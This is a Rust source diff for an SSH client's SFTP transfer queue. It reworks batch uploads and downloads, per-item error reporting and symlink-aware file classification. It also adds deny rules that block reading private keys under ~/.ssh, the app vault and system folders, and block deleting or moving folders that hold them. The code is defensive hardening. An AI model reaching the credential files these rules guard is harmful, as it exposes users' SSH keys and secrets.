+            .filter(|real| super::path_starts_with(real, root));
+        match (created, real) {
+            (Ok(()), Some(real)) => {
+                made.insert(path, real);
+            }
+            _ => {
+                log::warn!(
+                    "[sshspan-sftp] skipping download dir {}: could not be created under {}",
+                    path.display(),
+                    root.display()
+                );
+                out.notes.push(format!(
+                    "skipped {}: could not be created locally",
+                    path.display()
+                ));
+                rejected.push(path);
+            }
         }
     }
     for file in plan.files {
@@ -2021,9 +4061,38 @@ async fn expand_download(
         if rejected.iter().any(|r| path.starts_with(r)) {
             continue;
         }
-        out.items.push(ctx.item(&file.remote, path, file.size));
+        match file_write_refusal(&path, &made, sensitive) {
+            Some(why) => out.notes.push(format!("skipped {}: {why}", file.remote)),
+            None => out.items.push(ctx.download(&file.remote, path, file.size)),
+        }
     }
-    Ok(out)
+    None
+}
+
+/// Why a file of a folder download must not be written, judged without
+/// touching the disk: its folder was checked in full and resolved when it was
+/// made (`made`: folder -> resolved folder), so the file's resolved path is
+/// that folder plus the file's own name. (A link already sitting at the
+/// file's path is replaced, never written through: the queue writes a fresh
+/// `<name>.part` without following links and renames it over the name.)
+fn file_write_refusal(
+    path: &std::path::Path,
+    made: &std::collections::HashMap<PathBuf, PathBuf>,
+    sensitive: &SensitiveLocations,
+) -> Option<String> {
+    let real_dir = path.parent().and_then(|dir| made.get(dir));
+    let (Some(real_dir), Some(name)) = (real_dir, path.file_name()) else {
+        return Some("its folder could not be created locally".to_string());
+    };
+    if !name.to_str().is_some_and(is_plain_local_name) {
+        return Some(
+            "its local path would not be a plain file name inside the destination folder"
+                .to_string(),
+        );
+    }
+    sensitive
+        .path_refusal(path, &real_dir.join(name), LocalAccess::Write)
+        .map(str::to_string)
 }
 
 /// Give every download of one `sftp_queue_add` batch a local path no other job
@@ -2143,9 +4212,14 @@ where
                     continue;
                 }
                 EntryKind::Unknown => {
-                    out.failed.push(format!(
-                        "{child}: not changed (the server does not say whether it is a file or a folder)"
-                    ));
+                    out.failed.push(match &entry.why {
+                        Some(why) => format!(
+                            "{child}: not changed (could not tell whether it is a file or a folder: {why})"
+                        ),
+                        None => format!(
+                            "{child}: not changed (the server does not say whether it is a file or a folder)"
+                        ),
+                    });
                     continue;
                 }
                 EntryKind::Dir => apply_dirs,
@@ -2214,7 +4288,21 @@ pub async fn sftp_queue_add(
     // legitimately contain "skip this one, resume that one". Without the
     // per-item read the batch-wide value won and every dialog decision was
     // silently flattened to it.
-    let batch_resume = resolve_resume_mode(&app, resume.as_deref());
+    //
+    // The default comes from the settings (a database read) and the
+    // protected locations are resolved once for the whole batch (filesystem
+    // work): both off the async runtime.
+    let (batch_resume, sensitive) = {
+        let (app, resume) = (app.clone(), resume.clone());
+        tokio::task::spawn_blocking(move || {
+            (
+                resolve_resume_mode(&app, resume.as_deref()),
+                SensitiveLocations::current(),
+            )
+        })
+        .await
+        .map_err(|e| CmdError(format!("Could not prepare the transfer: {e}")))?
+    };
     let preserve_ts = preserve_ts.unwrap_or(false);
     let server_name = app
         .state::<StdArc<SessionRegistry>>()
@@ -2224,37 +4312,29 @@ pub async fn sftp_queue_add(
         .map(|(_, name, _, _, _)| name)
         .unwrap_or_default();
 
-    let mut jobs: Vec<QueuedItem> = Vec::new();
-    let mut notes = Notes::default();
-    match kind {
+    let batch = BatchCtx {
+        session_id: &session_id,
+        server_name: &server_name,
+        resume: batch_resume,
+        preserve_ts,
+    };
+    let expansion = match kind {
         JobKind::Upload => {
-            for item in &items {
-                let local = item
-                    .get("local")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or_default();
-                let remote = item
-                    .get("remote")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or_default();
-                if local.is_empty() || remote.is_empty() {
-                    continue;
-                }
-                // Same gate the single-file sftp_upload applies: the local
-                // upload source must not be the app data dir (the vault), a
-                // system directory or private-key material. This is the
-                // boundary the queue path must not skip.
-                validate_sftp_local_path(local, LocalAccess::Read)?;
-                expand_upload(
-                    PathBuf::from(local),
-                    remote.to_string(),
-                    session_id.clone(),
-                    server_name.clone(),
-                    item_resume(item, batch_resume),
+            // A local walk of possibly thousands of files: a blocking task.
+            let (session_id, server_name) = (session_id.clone(), server_name.clone());
+            let sensitive = Arc::clone(&sensitive);
+            tokio::task::spawn_blocking(move || {
+                let batch = BatchCtx {
+                    session_id: &session_id,
+                    server_name: &server_name,
+                    resume: batch_resume,
                     preserve_ts,
-                    &mut jobs,
-                );
-            }
+                };
+                expand_upload_batch(&items, &batch, &sensitive)
+            })
+            .await
+            .map_err(|e| CmdError(format!("Could not prepare the upload: {e}")))?
+            .map_err(CmdError)?
         }
         JobKind::Download => {
             let sftp = sftp_from_session(&app, &session_id)?;
@@ -2265,64 +4345,288 @@ pub async fn sftp_queue_add(
             // gate the single-file download uses (plus the write deny-list),
             // BEFORE any directory is created - dest_dir must not be able to
             // aim the batch at the vault directory or at `~/.ssh`.
-            validate_sftp_local_path(&dest.to_string_lossy(), LocalAccess::Write)?;
-            let _ = tokio::fs::create_dir_all(&dest).await;
-            // Anchor every queued local path at the canonical destination:
-            // the walk below joins remote-supplied names onto this root and
-            // verifies the result stays under it.
-            let root = tokio::fs::canonicalize(&dest)
+            validate_sftp_local_path_with(&dest.to_string_lossy(), LocalAccess::Write, &sensitive)?;
+            expand_download_batch(&sftp, &items, &dest, &batch, Arc::clone(&sensitive))
                 .await
-                .map_err(|e| CmdError(format!("destination not accessible: {e}")))?;
-            for item in &items {
-                let remote = item
-                    .get("remote")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or_default();
-                if remote.is_empty() {
-                    continue;
-                }
-                // Download-side rename: the renderer resolves a conflict to a
-                // free local name and passes it here. Only the FILE case can
-                // use it (a directory expands into many names), which
-                // `expand_download` enforces.
-                let local_name = item
-                    .get("localName")
-                    .and_then(|v| v.as_str())
-                    .filter(|s| !s.is_empty());
-                let ctx = DownloadCtx {
-                    session_id: &session_id,
-                    server_name: &server_name,
-                    resume: item_resume(item, batch_resume),
-                    preserve_ts,
-                };
-                let expanded = expand_download(&sftp, remote, &root, &ctx, local_name)
-                    .await
-                    .map_err(CmdError)?;
-                jobs.extend(expanded.items);
-                notes.extend(expanded.notes);
-            }
-            // Two remote names can map to one local path (sanitising `back:up`
-            // and `back_up`, or `README` / `readme` on a case-insensitive disk,
-            // which any destination might be): the jobs would share one `.part`
-            // and clobber each other (A7-57).
-            for note in dedupe_local_targets(&mut jobs) {
-                notes.push(note);
-            }
+                .map_err(CmdError)?
         }
         // ServerCopy never reaches here (guarded above).
         JobKind::ServerCopy => unreachable!("guarded above"),
-    }
+    };
 
-    let count = jobs.len();
     // Things the expansion skipped (symbolic links, unreadable folders, names
     // that cannot be used locally, renamed collisions). Always present; an
     // empty array means a clean expansion.
-    let warnings = notes.into_vec();
+    let warnings = expansion.warnings();
+    let BatchExpansion { jobs, outcomes, .. } = expansion;
+    // Every item failed: the call fails, with each item's reason.
+    if let Some(failure) = batch_failure(&outcomes) {
+        return Err(CmdError(failure));
+    }
+    let count = jobs.len();
     if count == 0 {
-        return Ok(serde_json::json!({ "ok": true, "added": 0, "warnings": warnings }));
+        return Ok(serde_json::json!({
+            "ok": true, "added": 0, "warnings": warnings, "items": outcomes,
+        }));
     }
     q_enqueue(&app, jobs);
-    Ok(serde_json::json!({ "ok": true, "added": count, "warnings": warnings }))
+    Ok(serde_json::json!({
+        "ok": true, "added": count, "warnings": warnings, "items": outcomes,
+    }))
+}
+
+/// What every item of one `sftp_queue_add` call shares.
+struct BatchCtx<'a> {
+    session_id: &'a str,
+    server_name: &'a str,
+    /// The batch-wide resume mode; an item may override it.
+    resume: ResumeMode,
+    preserve_ts: bool,
+}
+
+/// Whether one picked item was queued.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
+#[serde(rename_all = "camelCase")]
+enum ItemStatus {
+    Queued,
+    Error,
+}
+
+/// The result of one picked item of a `sftp_queue_add` call.
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
+#[serde(rename_all = "camelCase")]
+struct ItemOutcome {
+    /// The item as it was picked: the remote path of a download, the local
+    /// path of an upload.
+    path: String,
+    status: ItemStatus,
+    /// Transfers queued for it (a folder can be many, or none if it is empty).
+    added: usize,
+    /// Why nothing was queued for it: a sentence naming the item.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    error: Option<String>,
+    /// What was left out of it, and why.
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    warnings: Vec<String>,
+}
+
+impl ItemOutcome {
+    fn queued(path: &str, added: usize) -> Self {
+        Self {
+            path: path.to_string(),
+            status: ItemStatus::Queued,
+            added,
+            error: None,
+            warnings: Vec::new(),
+        }
+    }
+
+    fn failed(path: &str, error: String) -> Self {
+        Self {
+            path: path.to_string(),
+            status: ItemStatus::Error,
+            added: 0,
+            error: Some(error),
+            warnings: Vec::new(),
+        }
+    }
+}
+
+impl BatchExpansion {
+    /// Record a failed item. Its reason also goes into the warnings (see
+    /// [`Self::warnings`]), which renderers that do not read `items` yet
+    /// already show.
+    fn fail(&mut self, path: &str, error: String) {
+        self.errors.push(error.clone());
+        self.outcomes.push(ItemOutcome::failed(path, error));
+    }
+
+    /// Record a queued item: its jobs, and what its walk left out - the
+    /// item's own warnings, and the batch's.
+    fn queued(&mut self, path: &str, jobs: Vec<QueuedItem>, notes: Notes) {
+        let mut outcome = ItemOutcome::queued(path, jobs.len());
+        outcome.warnings = notes.to_vec();
+        self.outcomes.push(outcome);
+        self.jobs.extend(jobs);
+        self.notes.extend(notes);
+    }
+
+    /// The `warnings` of the `sftp_queue_add` result: every failed item's
+    /// error first, never dropped, then the walks' notes (capped, see
+    /// [`Notes`]). The errors used to share the cap with the notes, so the
+    /// notes of one big folder (30 skipped links) hid another pick's error.
+    fn warnings(&self) -> Vec<String> {
+        self.errors
+            .iter()
+            .cloned()
+            .chain(self.notes.to_vec())
+            .collect()
+    }
+}
+
+/// Everything one `sftp_queue_add` call expanded to.
+#[derive(Default)]
+struct BatchExpansion {
+    jobs: Vec<QueuedItem>,
+    /// Why each failed item failed, one sentence per item.
+    errors: Vec<String>,
+    /// What the walks left out.
+    notes: Notes,
+    outcomes: Vec<ItemOutcome>,
+}
+
+/// The error a `sftp_queue_add` call fails with when every item failed (one
+/// line per item); `None` when at least one was queued - an empty folder
+/// counts - or there were no items.
+fn batch_failure(outcomes: &[ItemOutcome]) -> Option<String> {
+    let errors: Vec<&str> = outcomes.iter().filter_map(|o| o.error.as_deref()).collect();
+    (!outcomes.is_empty() && errors.len() == outcomes.len()).then(|| errors.join("\n"))
+}
+
+/// Whether an upload source can be read at all: it exists, and a folder can
+/// be listed. (The walk skips what it cannot read, so a missing pick used to
+/// vanish without a word.)
+fn readable_upload_source(local: &str) -> Result<(), String> {
+    let md = std::fs::symlink_metadata(local)
+        .map_err(|e| format!("{local}: could not be read ({e})."))?;
+    if md.is_dir() {
+        std::fs::read_dir(local).map_err(|e| format!("{local}: could not be read ({e})."))?;
+    }
+    Ok(())
+}
+
+/// The `local` and `remote` of one renderer-supplied item; empty when absent.
+fn item_paths(item: &serde_json::Value) -> (&str, &str) {
+    let field = |key: &str| item.get(key).and_then(|v| v.as_str()).unwrap_or_default();
+    (field("local"), field("remote"))
+}
+
+/// Expand the upload items of one `sftp_queue_add` call. Blocking (it walks
+/// local folders): run it off the async runtime.
+fn expand_upload_batch(
+    items: &[serde_json::Value],
+    batch: &BatchCtx<'_>,
+    sensitive: &SensitiveLocations,
+) -> Result<BatchExpansion, String> {
+    let mut out = BatchExpansion::default();
+    for item in items {
+        let (local, remote) = item_paths(item);
+        if local.is_empty() || remote.is_empty() {
+            continue;
+        }
+        // The read rules (`LocalAccess::Read`): the source must not be in
+        // the app data dir (the vault), a system directory or SSHSpan's
+        // configuration folder, nor anywhere under `~/.ssh` except a `*.pub`
+        // public key. A refused or unreadable pick is that item's result,
+        // not the end of the batch: one `~/.ssh/config` among the picks used
+        // to queue nothing at all.
+        if let Err(e) = validate_sftp_local_path_with(local, LocalAccess::Read, sensitive) {
+            out.fail(local, format!("{local}: {}", e.0));
+            continue;
+        }
+        if let Err(e) = readable_upload_source(local) {
+            out.fail(local, e);
+            continue;
+        }
+        let ctx = ItemCtx::new(item, batch);
+        match expand_upload(std::path::Path::new(local), remote, &ctx, sensitive) {
+            Ok((jobs, notes)) => out.queued(local, jobs, notes),
+            Err(why) => out.fail(local, format!("{local}: {why}")),
+        }
+    }
+    Ok(out)
+}
+
+/// The local half of [`expand_download_batch`] (blocking filesystem work):
+/// create `dest` only if some item has something to download, anchor every
+/// local path at its canonical form, and turn each prepared item into jobs.
+fn materialize_download_batch(
+    prepared: Vec<(String, ItemCtx, Result<Prepared, String>)>,
+    dest: &std::path::Path,
+    sensitive: &SensitiveLocations,
+) -> Result<BatchExpansion, String> {
+    let wanted = prepared
+        .iter()
+        .any(|(_, _, r)| matches!(r, Ok(Prepared::File { .. }) | Ok(Prepared::Folder(_))));
+    // Anchor every queued local path at the canonical destination: the
+    // remote names are joined onto this root and the result is verified to
+    // stay under it.
+    let root = if wanted {
+        let _ = std::fs::create_dir_all(dest);
+        Some(canonical(dest).map_err(|e| {
+            format!(
+                "The download folder {} cannot be used ({e}) - choose another folder.",
+                dest.display()
+            )
+        })?)
+    } else {
+        None
+    };
+    let mut out = BatchExpansion::default();
+    for (remote, ctx, result) in prepared {
+        match (result, &root) {
+            (Err(e), _) => out.fail(&remote, e),
+            (Ok(Prepared::Skip(why)), _) => out.fail(&remote, why),
+            (Ok(prepared), Some(root)) => {
+                let mut expanded = ExpandedDownload::default();
+                // A refused item made nothing: no jobs, no notes.
+                match materialize_download(prepared, root, &ctx, sensitive, &mut expanded) {
+                    Some(why) => out.fail(&remote, why),
+                    None => out.queued(&remote, expanded.items, expanded.notes),
+                }
+            }
+            // `wanted` was true for every File/Folder, so a root exists.
+            (Ok(_), None) => unreachable!("a destination is created for every item to download"),
+        }
+    }
+    Ok(out)
+}
+
+/// Expand the download items of one `sftp_queue_add` call into `dest`.
+async fn expand_download_batch(
+    sftp: &russh_sftp::client::SftpSession,
+    items: &[serde_json::Value],
+    dest: &std::path::Path,
+    batch: &BatchCtx<'_>,
+    sensitive: Arc<SensitiveLocations>,
+) -> Result<BatchExpansion, String> {
+    // The remote half for EVERY item first: one picked folder that cannot be
+    // listed used to fail the whole call after the local folders of the
+    // items before it had been created. Now it is that item's error, nothing
+    // local is made for it, and the destination itself is only created once
+    // there is something to put in it.
+    let mut prepared: Vec<(String, ItemCtx, Result<Prepared, String>)> = Vec::new();
+    for item in items {
+        let (_, remote) = item_paths(item);
+        if remote.is_empty() {
+            continue;
+        }
+        // Download-side rename: the renderer resolves a conflict to a
+        // free local name and passes it here. Only the FILE case can
+        // use it (a directory expands into many names).
+        let local_name = item
+            .get("localName")
+            .and_then(|v| v.as_str())
+            .filter(|s| !s.is_empty());
+        let result = prepare_download(sftp, remote, local_name).await;
+        prepared.push((remote.to_string(), ItemCtx::new(item, batch), result));
+    }
+    // The local half - creating folders, checking every local path - is
+    // filesystem work: off the async runtime, in one blocking task.
+    let dest = dest.to_path_buf();
+    let mut out = tokio::task::spawn_blocking(move || {
+        materialize_download_batch(prepared, &dest, &sensitive)
+    })
+    .await
+    .map_err(|e| format!("preparing the download failed: {e}"))??;
+    // Two remote names can map to one local path (sanitising `back:up`
+    // and `back_up`, or `README` / `readme` on a case-insensitive disk,
+    // which any destination might be): the jobs would share one `.part`
+    // and clobber each other (A7-57).
+    for note in dedupe_local_targets(&mut out.jobs) {
+        out.notes.push(note);
+    }
+    Ok(out)
 }
 
 #[tauri::command]
@@ -2444,15 +4748,14 @@ pub async fn sftp_server_copy(
     let sftp = crate::sftp::queue::open_transfer_channel(&app, &from_session_id)
         .await
         .map_err(CmdError)?;
-    let md = sftp
-        .metadata(&remote)
+    let is_dir = server_copy_root_is_dir(&sftp, &remote)
         .await
-        .map_err(|e| CmdError(format!("stat {remote}: {e}")))?;
+        .map_err(CmdError)?;
 
     let name = remote.rsplit('/').next().unwrap_or("file");
     let base_target = format!("{}/{}", target_dir.trim_end_matches('/'), name);
 
-    if md.is_dir() {
+    if is_dir {
         // Stream the walk: enqueue per-file jobs in batches as the tree is
         // scanned so transfers start immediately (workers run in parallel with
         // the walk) instead of waiting for a full scan of a huge tree. The
@@ -2460,8 +4763,9 @@ pub async fn sftp_server_copy(
         // while already-queued jobs keep running.
         let visited = std::sync::Arc::new(std::sync::Mutex::new(std::collections::HashSet::new()));
         let scanned = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+        let enqueue = |batch: Vec<QueuedItem>| q_enqueue(&app, batch);
         let walk = expand_server_copy(
-            &app,
+            &enqueue,
             &sftp,
             remote,
             base_target.clone(),
@@ -2564,7 +4868,7 @@ pub async fn sftp_server_copy(
 ///   the queue.
 #[allow(clippy::too_many_arguments)]
 fn expand_server_copy<'a>(
-    app: &'a AppHandle,
+    enqueue: &'a (dyn Fn(Vec<QueuedItem>) + Send + Sync),
     sftp: &'a russh_sftp::client::SftpSession,
     remote_dir: String,
     target_base: String,
@@ -2606,25 +4910,49 @@ fn expand_server_copy<'a>(
                 );
                 continue;
             };
-            let child_remote = format!("{}/{}", remote_dir.trim_end_matches('/'), safe);
+            // The source is read under its REAL name; only the target gets
+            // the sanitized one. (The source path used the sanitized name, so
+            // any name that needed sanitizing - `back:up` - was read from a
+            // file that does not exist.)
+            let child_remote = join_remote(&remote_dir, &name);
             let child_target = format!("{}/{}", target_base.trim_end_matches('/'), safe);
             // Classify from the listing's own attributes (symlink-aware): no
-            // per-file stat round-trip. Symlinks are skipped, never followed.
+            // per-file stat round-trip, except on a server that leaves the
+            // type bits out (see `classify_untyped`) - every entry there used
+            // to be copied as a file, folders and links included.
             let md = entry.metadata();
-            let ftype = md.file_type();
-            if ftype.is_symlink() {
-                log::debug!("[sshspan-sftp] send-to: skipping symlink {child_remote}");
-                continue;
+            let kind = match classify_attrs(&md) {
+                Some(kind) => kind,
+                None => classify_untyped(sftp, &child_remote).await.0,
+            };
+            match kind {
+                EntryKind::Dir | EntryKind::File => {}
+                // Never followed.
+                EntryKind::Symlink => {
+                    log::debug!("[sshspan-sftp] send-to: skipping symlink {child_remote}");
+                    continue;
+                }
+                // A pipe's read blocks the source server; a device is no file.
+                EntryKind::Other => {
+                    log::info!("[sshspan-sftp] send-to: skipping special file {child_remote}");
+                    continue;
+                }
+                EntryKind::Unknown => {
+                    log::warn!(
+                        "[sshspan-sftp] send-to: skipping {child_remote}: could not tell whether it is a file or a folder"
+                    );
+                    continue;
+                }
             }
-            if ftype.is_dir() {
+            if kind == EntryKind::Dir {
                 // Flush pending files before recursing so ordering stays
                 // breadth-friendly and the queue keeps filling.
                 if !batch.is_empty() {
                     scanned.fetch_add(batch.len(), std::sync::atomic::Ordering::SeqCst);
-                    q_enqueue(app, std::mem::take(&mut batch));
+                    enqueue(std::mem::take(&mut batch));
                 }
                 expand_server_copy(
-                    app,
+                    enqueue,
                     sftp,
                     child_remote,
                     child_target,
@@ -2637,8 +4965,7 @@ fn expand_server_copy<'a>(
                 )
                 .await?;
             } else {
-                // Regular file. file_type() is `Other` when a server omits
-                // permission bits, so treat non-dir/non-symlink as copyable.
+                // A regular file.
                 batch.push(QueuedItem {
                     kind: JobKind::ServerCopy,
                     session_id: from_session_id.clone(),
@@ -2656,16 +4983,39 @@ fn expand_server_copy<'a>(
                 });
                 if batch.len() >= FLUSH_EVERY {
                     scanned.fetch_add(batch.len(), std::sync::atomic::Ordering::SeqCst);
-                    q_enqueue(app, std::mem::take(&mut batch));
+                    enqueue(std::mem::take(&mut batch));
                 }
             }
         }
         if !batch.is_empty() {
             scanned.fetch_add(batch.len(), std::sync::atomic::Ordering::SeqCst);
-            q_enqueue(app, batch);
+            enqueue(batch);
         }
         Ok(())
     })
+}
+
+/// Whether the path a "Send to" starts from is a folder (walked) or a file
+/// (one job) - settled like any picked path (see [`picked_root_kind`]); a
+/// pipe, socket or device, or a path whose type cannot be told, is refused.
+async fn server_copy_root_is_dir(
+    sftp: &russh_sftp::client::SftpSession,
+    remote: &str,
+) -> Result<bool, String> {
+    let md = sftp
+        .metadata(remote)
+        .await
+        .map_err(|e| format!("stat {remote}: {e}"))?;
+    match picked_root_kind(sftp, remote, &md).await {
+        EntryKind::Dir => Ok(true),
+        EntryKind::File | EntryKind::Symlink => Ok(false),
+        EntryKind::Other => Err(format!(
+            "{remote} is not a regular file or folder (a pipe, socket or device), so it cannot be sent."
+        )),
+        EntryKind::Unknown => Err(format!(
+            "The server does not say whether {remote} is a file or a folder, so it cannot be sent."
+        )),
+    }
 }
 
 // ─── recursive remote search ───────────────────────────────────────────────
@@ -3015,7 +5365,15 @@ fn validate_local_mutation(app: &AppHandle, path: &str) -> CmdResult<PathBuf> {
 /// The filesystem-probing half of [`validate_local_mutation`] (everything but
 /// the vault gate), so the async commands can run it inside `spawn_blocking`.
 fn validate_local_target(path: &str, access: LocalAccess) -> CmdResult<PathBuf> {
-    validate_sftp_local_path(path, access)?;
+    validate_local_target_with(path, access, &SensitiveLocations::current())
+}
+
+fn validate_local_target_with(
+    path: &str,
+    access: LocalAccess,
+    sensitive: &SensitiveLocations,
+) -> CmdResult<PathBuf> {
+    validate_sftp_local_path_with(path, access, sensitive)?;
     let p = PathBuf::from(path);
     // A bare drive root (`C:\`) or `/` is technically absolute and outside the
     // app data dir, but "delete the root of the filesystem" is never what the
@@ -3024,6 +5382,47 @@ fn validate_local_target(path: &str, access: LocalAccess) -> CmdResult<PathBuf> 
         return Err("Refusing to operate on a filesystem root.".into());
     }
     Ok(p)
+}
+
+/// What a local delete must clear before anything is removed.
+/// The write deny-list applies to the path itself; a delete must also not
+/// take a protected location WITH it: deleting the home folder deleted
+/// `~/.ssh`, the shell rc files and SSHSpan's data.
+fn validate_local_delete_with(path: &str, sensitive: &SensitiveLocations) -> CmdResult<PathBuf> {
+    let target = validate_local_target_with(path, LocalAccess::Write, sensitive)?;
+    refuse_holding_folder(&target, "delete", sensitive)?;
+    Ok(target)
+}
+
+/// What a local rename or move must clear, for both of its ends. Moving the
+/// folder that holds `~/.ssh` away (its new name is on no list), writing into
+/// it and moving it back got round every check; so did moving a prepared
+/// folder into that place.
+fn validate_local_rename_with(
+    from: &str,
+    to: &str,
+    sensitive: &SensitiveLocations,
+) -> CmdResult<(PathBuf, PathBuf)> {
+    let src = validate_local_target_with(from, LocalAccess::Write, sensitive)?;
+    let dst = validate_local_target_with(to, LocalAccess::Write, sensitive)?;
+    refuse_holding_folder(&src, "move", sensitive)?;
+    refuse_holding_folder(&dst, "replace", sensitive)?;
+    Ok((src, dst))
+}
+
+/// Refuse to `verb` a folder that holds a protected location.
+fn refuse_holding_folder(
+    path: &std::path::Path,
+    verb: &str,
+    sensitive: &SensitiveLocations,
+) -> CmdResult<()> {
+    match sensitive.held_by(path) {
+        Some(what) => Err(CmdError(format!(
+            "{} contains {what}, so SSHSpan will not {verb} it. Choose the files or folders inside it instead.",
+            path.display()
+        ))),
+        None => Ok(()),
+    }
 }
 
 /// Create a directory on the LOCAL filesystem (dual-pane counterpart to
@@ -3042,8 +5441,8 @@ pub fn sftp_local_mkdir(app: AppHandle, path: String) -> CmdResult<serde_json::V
 /// rename cannot be used to move a file INTO the app data directory either.
 #[tauri::command]
 pub fn sftp_local_rename(app: AppHandle, from: String, to: String) -> CmdResult<serde_json::Value> {
-    let src = validate_local_mutation(&app, &from)?;
-    let dst = validate_local_mutation(&app, &to)?;
+    require_unlocked(&app)?;
+    let (src, dst) = validate_local_rename_with(&from, &to, &SensitiveLocations::current())?;
     if !src.exists() {
         return Err(CmdError(format!("Not found: {}", src.display())).into());
     }
@@ -3074,7 +5473,7 @@ pub async fn sftp_local_remove(
 }
 
 fn local_remove_blocking(path: &str, is_dir: bool) -> CmdResult<serde_json::Value> {
-    let target = validate_local_target(path, LocalAccess::Write)?;
+    let target = validate_local_delete_with(path, &SensitiveLocations::current())?;
     if !target.exists() {
         return Err(CmdError(format!("Not found: {}", target.display())).into());
     }
@@ -3158,11 +5557,13 @@ async fn chmod_one(
         .map_err(|e| format!("{path}: {}", sftp_error_detail(e)))
 }
 
-/// What the root of a recursive chmod is: STAT's type (a link is followed,
-/// like `chmod -R` on a command-line link), else LSTAT's, else whether it
-/// opens as a folder. A server whose STAT omits the type bits used to get a
-/// silent root-only change that ignored the files/dirs scope (JU1 review).
-async fn chmod_root_kind(
+/// What a path the user PICKED is - the root of a recursive chmod, of a
+/// download or of a "Send to": STAT's type (a link is followed, like
+/// `chmod -R` on a command-line link: the user chose it), else LSTAT's, else
+/// whether it opens as a folder. A server whose STAT omits the type bits used
+/// to get a silent root-only chmod that ignored the files/dirs scope (JU1
+/// review), and a folder it downloaded as if it were a file.
+async fn picked_root_kind(
     sftp: &russh_sftp::client::SftpSession,
     path: &str,
     stat: &russh_sftp::protocol::FileAttributes,
@@ -3222,7 +5623,7 @@ async fn chmod_path(
         .await
         .map_err(|e| format!("stat failed: {e}"))?;
     let root = if recursive {
-        chmod_root_kind(sftp, path, &md).await
+        picked_root_kind(sftp, path, &md).await
     } else {
         EntryKind::File
     };
@@ -3502,6 +5903,43 @@ pub(crate) async fn remote_sha256(
     Ok(format!("{:x}", hasher.finalize()))
 }
 
+/// SHA-256 of a remote file read to its END (for a server that reports no
+/// size, where [`remote_sha256`]'s size clamp cannot work), or `None` once it
+/// is larger than `cap` bytes.
+async fn remote_sha256_capped(
+    sftp: &russh_sftp::client::SftpSession,
+    path: &str,
+    cap: u64,
+) -> Result<Option<String>, String> {
+    use sha2::{Digest, Sha256};
+    use tokio::io::AsyncReadExt;
+    let mut file = sftp.open(path).await.map_err(sftp_error_detail)?;
+    let mut hasher = Sha256::new();
+    let mut buf = vec![0u8; 256 * 1024];
+    let mut total: u64 = 0;
+    let digest = loop {
+        let n = match file.read(&mut buf).await {
+            Ok(n) => n,
+            Err(e) => {
+                let _ = file.close().await;
+                return Err(describe_download_read_error(e).0);
+            }
+        };
+        if n == 0 {
+            break Some(format!("{:x}", hasher.finalize()));
+        }
+        total += n as u64;
+        if total > cap {
+            break None;
+        }
+        hasher.update(&buf[..n]);
+    };
+    if let Err(e) = file.close().await {
+        log::debug!("[sshspan-sftp] close after comparing {path}: {e}");
+    }
+    Ok(digest)
+}
+
 /// NOT REGISTERED in `generate_handler!`, deliberately: the renderer has no
 /// "verify" action that calls it (the queue's opt-in verification uses
 /// [`remote_sha256`] directly). Kept for the day it gets one.
@@ -3656,6 +6094,7 @@ mod tests {
             kind,
             size: 10,
             mtime: Some(1_600_000_000),
+            why: None,
         }
     }
 
@@ -3751,7 +6190,7 @@ mod tests {
                 ("/srv/photos/a.jpg".to_string(), "photos/a.jpg".to_string()),
             ]
         );
-        let mut dirs: Vec<String> = plan.dirs.iter().map(|d| d.join("/")).collect();
+        let mut dirs: Vec<String> = plan.dirs.iter().map(|d| d.rel.join("/")).collect();
         dirs.sort();
         assert_eq!(dirs, vec!["photos", "photos/2024", "photos/empty"]);
         assert_eq!(plan.notes.total, 0, "{:?}", plan.notes);
@@ -3973,10 +6412,10 @@ mod tests {
     // ─── the expansion against a real SFTP session ───────────────────────────
 
     #[cfg(unix)]
-    fn download_ctx(preserve_ts: bool) -> DownloadCtx<'static> {
-        DownloadCtx {
-            session_id: "sess",
-            server_name: "srv",
+    fn download_ctx(preserve_ts: bool) -> ItemCtx {
+        ItemCtx {
+            session_id: "sess".to_string(),
+            server_name: "srv".to_string(),
             resume: ResumeMode::Resume,
             preserve_ts,
         }
@@ -4615,10 +7054,13 @@ mod tests {
     #[test]
     fn ru4_probe_answers_are_never_guessed() {
         use russh_sftp::protocol::StatusCode as S;
-        for code in [S::BadMessage, S::Failure, S::NoSuchFile] {
-            assert!(readlink_says_not_a_link(&status_err(code, "")), "{code:?}");
-        }
+        assert!(readlink_says_not_a_link(&status_err(S::BadMessage, "")));
+        // RU6a fix round 1 (item 8): "failure" and "no such file" are not
+        // conclusive - a server that answers every READLINK with "failure"
+        // says it of a link too. Those go to the REALPATH check.
         for code in [
+            S::Failure,
+            S::NoSuchFile,
             S::OpUnsupported,
             S::PermissionDenied,
             S::ConnectionLost,
@@ -4695,6 +7137,213 @@ mod tests {
         assert_eq!(fx.mode("/t/d"), 0o755, "unknown type: unchanged");
         assert_eq!(out["changed"], 1, "{out}");
         assert!(out["failed"].to_string().contains("/t/d"), "{out}");
+    }
+
+    // ─── RU6a fix 1, item 1 (F1): the edit's temporary remote file ──────────
+
+    /// Names in the test server's `dir` that are edit temp files.
+    #[cfg(unix)]
+    fn temps_in(fx: &crate::sftp::testkit::Fixture, dir: &str) -> Vec<String> {
+        std::fs::read_dir(fx.path(dir))
+            .unwrap()
+            .filter_map(|e| e.ok())
+            .map(|e| e.file_name().to_string_lossy().into_owned())
+            .filter(|name| name.contains(EDIT_TMP_SUFFIX))
+            .collect()
+    }
+
+    /// The edit temp file the last upload opened (from the server's log).
+    #[cfg(unix)]
+    fn opened_temp(fx: &crate::sftp::testkit::Fixture) -> String {
+        fx.ops()
+            .iter()
+            .rev()
+            .filter_map(|op| op.strip_prefix("open "))
+            .filter_map(|rest| rest.split(' ').next())
+            .find(|path| path.contains(EDIT_TMP_SUFFIX))
+            .map(str::to_string)
+            .expect("an edit temp file was opened")
+    }
+
+    /// What `path` is on the test server: "link", "file" or "missing".
+    #[cfg(unix)]
+    fn kind_of(fx: &crate::sftp::testkit::Fixture, path: &str) -> &'static str {
+        match std::fs::symlink_metadata(fx.path(path)) {
+            Ok(md) if md.file_type().is_symlink() => "link",
+            Ok(_) => "file",
+            Err(_) => "missing",
+        }
+    }
+
+    /// Something already at the temp name - a link to another file, or
